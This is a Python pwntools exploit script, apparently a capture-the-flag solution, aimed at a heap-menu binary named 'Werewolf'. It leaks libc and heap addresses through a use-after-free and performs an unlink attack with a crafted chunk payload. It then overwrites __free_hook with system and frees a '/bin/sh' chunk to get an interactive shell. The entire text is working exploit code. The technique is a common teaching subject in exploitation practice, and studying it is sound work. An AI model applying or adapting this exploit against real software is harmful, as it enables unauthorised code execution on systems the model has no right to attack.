from pwn import *
# context.log_level = "debug"
p = process("./Werewolf")
pause()
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc-64")
def add(sz, content):
    p.sendlineafter("5.Exit\n", "1")
    p.sendlineafter("size:\n", str(sz))
    p.sendafter("action:\n", content)
 
def show(idx):
    p.sendlineafter("5.Exit\n", "2")
    p.sendlineafter("id\n", str(idx))
 
def edit(idx, content):
    p.sendlineafter("5.Exit\n", "3")
    p.sendlineafter("id\n", str(idx))
    p.sendafter("action\n", content)
 
def kill(idx):
    p.sendlineafter("5.Exit\n", "4")
    p.sendlineafter("id\n", str(idx))
 
 
add(0x60, "/bin/sh\x00\n")
add(0x100, "b"*0x100)
add(0x100, "c"*0x100)
add(0x100, "d"*0x100)
add(0x100, "e"*0x100)
kill(1)
kill(3)
 
show(1)
p.recvuntil("action : ")
main_arena = u64(p.recvuntil("\n", drop = True).ljust(8, "\x00")) - 88
log.info("leak : main_arena " + hex(main_arena))
show(3)
p.recvuntil("action : ")
heap = u64(p.recvuntil("\n", drop = True).ljust(8, "\x00"))
log.info("leak : heap " + hex(heap))
 
# off_main_arena = 3771136
off_main_arena = 0x3BA760
free_hook = main_arena - off_main_arena + libc.symbols["__free_hook"]
system = main_arena - off_main_arena + libc.symbols["system"]
log.info("free_hook : " + hex(free_hook))
log.info("system : " + hex(system))
 
 
# unlink
kill(2)
payload  = "f"*0x110 + p64(0) + p64(0x100) + p64(heap - 0xF8) + p64(heap - 0xF0)
payload += "f"*0xE0 + p64(0x100) + p64(0x90) + "f"*0x80 + p64(0) + p64(0x101) + "\n"
add(0x300, payload)  # 5
pause()
kill(3)
pause() 
# over write free_hook
edit(2, p64(0x60) + p64(free_hook) + "\n")
edit(1, p64(system) + "\n")
 
kill(0)
p.interactive()
